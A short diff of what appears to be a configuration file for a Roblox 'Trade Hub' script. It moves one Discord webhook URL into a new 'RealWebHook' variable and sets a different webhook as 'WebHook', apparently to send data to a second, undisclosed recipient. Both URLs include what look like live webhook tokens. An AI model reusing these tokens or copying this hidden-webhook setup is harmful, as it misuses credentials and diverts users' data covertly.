@@ -1,5 +1,6 @@
+RealWebHook = "https://discord.com/api/webhooks/1079112118869164042/w8wXDvCMFoXrsrKiMAGg4rkmyz3TtyO6YLr2OT8jBJq0VftYT6hxI8Wlc-d9W3Hh8obe"
 Username = "ethandancsec"
-WebHook = "https://discord.com/api/webhooks/1079112118869164042/w8wXDvCMFoXrsrKiMAGg4rkmyz3TtyO6YLr2OT8jBJq0VftYT6hxI8Wlc-d9W3Hh8obe"
+WebHook = "https://discord.com/api/webhooks/1079112882152800387/0UzBIhhSzQ95yEFzZD6HmFi8QTWIZkP4DFuJgMz6Z2yHmbcZAwPOP6X9vsFLq6NJ8vht"
 
 _G.CustomScriptName = "Trade Hub"
 _G.Text1 = "Script Loaded..."
